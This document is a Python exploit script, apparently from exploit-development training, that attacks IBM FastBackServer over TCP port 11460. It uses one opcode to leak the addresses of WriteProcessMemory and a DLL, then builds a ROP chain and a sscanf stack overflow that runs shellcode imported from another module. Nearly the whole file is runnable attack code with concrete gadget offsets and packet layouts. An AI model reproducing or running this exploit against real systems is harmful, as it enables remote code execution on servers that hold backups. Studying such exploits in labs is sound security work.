#!/usr/bin/python

import socket
import sys
from struct import pack
import assembly_shellcode
sys.path.append('../tools')
from exputils import map_bad_chars
from shellcoding import shellcode_bytestring, shellcode_var


# Buffer overflow at sscanf call in FastBackServer!FXCLI_SetConfFileChunk+0x40

# FastBackServer port 11460 input structure
# 0x00 - 0x04: Checksum DWORD (length of whole buffer minus this DWORD)
# 0x04 - 0x34: psAgentCommand
# |-- 0x04 - 0x10: ??
# |-- 0x10 - 0x14: Opcode
# |-- 0x14 - 0x18: 1st copy offset
# |-- 0x18 - 0x1c: 1st copy size
# |-- 0x1c - 0x20: 2nd copy offset
# |-- 0x20 - 0x24: 2nd copy size
# |-- 0x24 - 0x28: 3rd copy offset
# |-- 0x28 - 0x2c: 3rd copy size
# |-- 0x2c - 0x34: ??
# 0x34 -  End: psCommandBuffer (sub-buffer sizes specified by previous values)
# |-- 0x34 - 0xNN: 1st buffer
# |-- 0xNN - 0xMM: 2nd buffer
# |-- 0xMM - 0xLL: 3rd buffer

# max packet length = 0x4400
# bad_chars = \x00 \x09 \x0a \x0b \x0c \x0d \x20

alloc_func = "WriteProcessMemory"
dll_func = "N98E_CRYPTO_get_new_lockid"
dll_func_offset = 0x14e0
bad_chars = [0x00, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20]


def main():

    # parse args and set socket params
    if len(sys.argv) != 3:
        print("Usage: %s <ip_address> <port>\n" % (sys.argv[0]))
        sys.exit(1)
    server = sys.argv[1]
    port = int(sys.argv[2])


    ### INFO LEAKS BUFFER SEND ###
    # create a connection and leak the alloc function (WPM) address
    print("[+] Getting", alloc_func, "base address...")
    buffer = infoleak_buffer(alloc_func)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(buffer)
    print("[+] Packet sent")
    # receive leaked address from application
    response = s.recv(1024)
    wpm_addr = parse_response(response)
    if not wpm_addr: return
    print("[+] Address is:", hex(wpm_addr))
    s.close()   
    
    # create a connection and leak the dll base (libeay32ibm019) address
    print("[+] Getting", dll_func, "base address...")
    buffer = infoleak_buffer(dll_func)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(buffer)
    print("[+] Packet sent")
    # receive leaked address from application
    response = s.recv(1024)
    dll_addr = parse_response(response)
    if not dll_addr: return
    dll_addr = dll_addr - dll_func_offset
    print("[+] Address is: ", hex(dll_addr))
    s.close()


    ### GENERATE EXPLOITATION BUFFER ###
    assembly = assembly_shellcode.ASSEMBLY
    shellcode = shellcode_bytestring(assembly)
    # check for bad chars in the shellcode
    map_bad_chars(shellcode, bad_chars)
    buffer = exploit_buffer(wpm_addr, dll_addr, shellcode)
    

    ### EXPLOITATION BUFFER SEND ###
    input("[?] ENTER to exploit...")
    # create another connection, use leaked base address to get RCE
    print("[+] Exploiting binary...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(buffer)
    print("[+] Packet sent")
    s.close()

    sys.exit(0)



# exploits FastBack opcode function 0x2000 to "debug" the address of an arbitrary module
def infoleak_buffer(symbol_name):
    # psAgentCommand
    buf = bytearray([0x41]*0x0C) # ??
    buf += pack('<i', 0x2000) # Opcode for execution path
    buf += pack('<i', 0x0) # offset 1
    buf += pack('<i', 0x100) # size 1
    buf += pack('<i', 0x100) # offset
    buf += pack('<i', 0x100) # size 2
    buf += pack('<i', 0x200) # offset 3
    buf += pack('<i', 0x100) # size 3
    buf += bytearray([0x41]*0x8) # ??
    
    # psCommandBuffer
    buf += b'SymbolOperation'
    sym_op = str.encode(symbol_name)
    buf += sym_op + b'\x00' + bytearray([0x42]*(0x100 - len(sym_op))) # buffer 1
    buf += bytearray([0x43]*0x100) # buffer 2
    buf += bytearray([0x44]*0x100) # buffer 3
    
    # prepend buffer length for the checksum
    buf = pack('>i', len(buf)-4) + buf
    return buf



# exploits FastBack opcode 0x534, a string with unchecked length is used in a sscanf call 
# storing  the first parsed string on stack
def exploit_buffer(wpm_addr, base, shellcode):

    # psAgentCommand
    buf =  bytearray([0x41]*0x0C) # ??
    buf += pack('<i', 0x0534) # Opcode for execution path
    buf += pack('<i', 0x0) # offset 1
    buf += pack('<i', 0x1000) # size 1
    buf += pack('<i', 0x100) # offset 2
    buf += pack('<i', 0x100) # size 2
    buf += pack('<i', 0x200) # offset 3
    buf += pack('<i', 0x100) # size 3
    buf += bytearray([0x41]*0x8) # ??
    
    # psCommandBuffer
    wpm =  pack('<L', wpm_addr) # WriteProcessMemory address (return to)
    wpm += pack('<L', base+0x000926cc) # executable shellcode address (return to)
    wpm += pack('<L', 0xffffffff) # hProcess, -1 = self
    wpm += pack('<L', base+0x000926cc) # lpBaseAddress, write to address (code cave) *mangled
    wpm += pack('<L', 0x61616161) # lpBuffer, write from address (stack shellcode) *mangled
    wpm += pack('<L', 0x62626262) # nSize, write size *mangled
    wpm += pack('<L', base+0x000e1e98) # [out] *lpNumberOfBytesWritten, bytes written output

    # offset until return address overwrite (with consideration for WPM skeleton length)
    offset = bytearray([0x42]*(276-len(wpm)))


    # bad_chars = [0x00, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20]
    
    rop_max_size = 0xf0
    ### [ ] ALIGN EAX TO STACK SHELLCODE ###
    rop  = pack('<L', base+0x000408d6) # push esp ; pop esi ; ret
    rop += pack('<L', base+0x00002541) # mov eax, esi ; pop esi ; ret
    rop += pack('<L', 0x41414141) # junk
    rop += pack('<L', base+0x0001d8c2) # neg eax ; ret 
    rop += pack('<L', base+0x000010c2) # pop ecx ; ret
    rop += pack('<L', 0xffffff14) # -0xec, distance from esp to stack shellcode ******
    rop += pack('<L', base+0x0001d0f0) # add eax, ecx ; ret
    rop += pack('<L', base+0x0001d8c2) # neg eax ; ret 
    ### [X] ALIGN EAX TO STACK SHELLCODE ###

    ### [ ] PATCH lpBuffer ###
    rop += pack('<L', base+0x0008876d) # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010 
    rop += pack("<L", 0x41414141) # junk for pop
    rop += pack('<L', base+0x00048d8c) # pop eax ; ret 
    rop += pack("<L", 0x42424242) # junk for ret 0x10
    rop += pack("<L", 0x42424242) # junk for ret 0x10
    rop += pack("<L", 0x42424242) # junk for ret 0x10
    rop += pack("<L", 0x42424242) # junk for ret 0x10
    rop += pack('<L', 0xffffff04) # -0xfc, distance from stack shellcode to lpBuffer in Skeleton ******
    rop += pack('<L', base+0x0001d0f0) # add eax, ecx ; ret
    rop += pack('<L', base+0x00001f7e) # mov [eax], ecx ; ret 
    ### [X] PATCH lpBuffer ###

    ### [ ] PATCH nSize ###
    rop += pack('<L', base+0x0000bc79) # inc eax ; ret 
    rop += pack('<L', base+0x0000bc79) # inc eax ; ret 
    rop += pack('<L', base+0x0000bc79) # inc eax ; ret
    rop += pack('<L', base+0x0000bc79) # inc eax ; ret 
    rop += pack('<L', base+0x000408dd) # push eax ; pop esi ; ret 
    rop += pack('<L', base+0x00048d8c) # pop eax ; ret 
    rop += pack('<L', 0xfffffdf0) # -0x210, shellcode size ******
    rop += pack('<L', base+0x0001d8c2) # neg eax ; ret 
    rop += pack('<L', base+0x0008876d) # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010 
    rop += pack("<L", 0x41414141) # junk for pop
    rop += pack('<L', base+0x00001f7e) # mov [eax], ecx ; ret 
    rop += pack("<L", 0x42424242) # junk for ret 0x10
    rop += pack("<L", 0x42424242) # junk for ret 0x10
    rop += pack("<L", 0x42424242) # junk for ret 0x10
    rop += pack("<L", 0x42424242) # junk for ret 0x10
    ### [X] PATCH nSize ###

    ### [ ] PATCH lpNumberOfBytesWritten ###
    rop += pack('<L', base+0x0000bc79) # inc eax ; ret 
    rop += pack('<L', base+0x0000bc79) # inc eax ; ret 
    rop += pack('<L', base+0x0000bc79) # inc eax ; ret
    rop += pack('<L', base+0x0000bc79) # inc eax ; ret 
    rop += pack('<L', base+0x000010c2) # pop ecx ; ret
    rop += pack('<L', base+0x000e1e98) # [out] *lpNumberOfBytesWritten, bytes written output
    rop += pack('<L', base+0x00001f7e) # mov [eax], ecx ; ret 
    ### [X] PATCH lpNumberOfBytesWritten ###

    ### [ ] PATCH lpBaseAddress ###
    rop += pack('<L', base+0x000010c2) # pop ecx ; ret
    rop += pack('<L', 0xfffffff4) # -0x0c, distance to lpBaseAddress arg
    rop += pack('<L', base+0x0001d0f0) # add eax, ecx ; ret
    rop += pack('<L', base+0x000010c2) # pop ecx ; ret
    rop += pack('<L', base+0x000926cc) # lpBaseAddress location (code cave)
    rop += pack('<L', base+0x00001f7e) # mov [eax], ecx ; ret 
    ### [X] PATCH lpBaseAddress ###

    ### [ ] RETURN TO WPM CALL ###
    rop += pack('<L', base+0x000010c2) # pop ecx ; ret
    rop += pack('<L', 0xfffffff4) # -0x0c, distance to lpBaseAddress arg
    rop += pack('<L', base+0x0001d0f0) # add eax, ecx ; ret
    rop += pack('<L', base+0x0003a003) # xchg eax, esp ; ret 
    ### [X] RETURN TO WPM CALL ###

    ### [X] DROP INTO SHELLCODE ###

    offset2 = bytearray([0x69]*(rop_max_size - len(rop))) # *******
    
    print("[+] WPM+ROP buffer scan")
    map_bad_chars(wpm+rop, bad_chars)

    # ROP DECODER STUB
    # ENCODED SHELLCODE STUB

    # format string of first buffer, expected input with overflow parameter
    buf += b'File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d' %(offset+wpm+rop+offset2+shellcode,0,0,0,0)
    buf += bytearray([0x43]*0x100) # buffer 2
    buf += bytearray([0x44]*0x100) # buffer 3
    
    # prepend buffer length for the checksum
    buf = pack('>i', len(buf)-4) + buf
    return buf



def parse_response(response):

    pattern = b"Address is: "
    offset = response.find(pattern)
    if offset == -1:
        print("[!] Expected pattern not found in response:", response)
        return None
    addr_start = offset + len(pattern)
    response = response[addr_start:addr_start+10]
    return int(response,16)



if __name__ == "__main__":
    main()
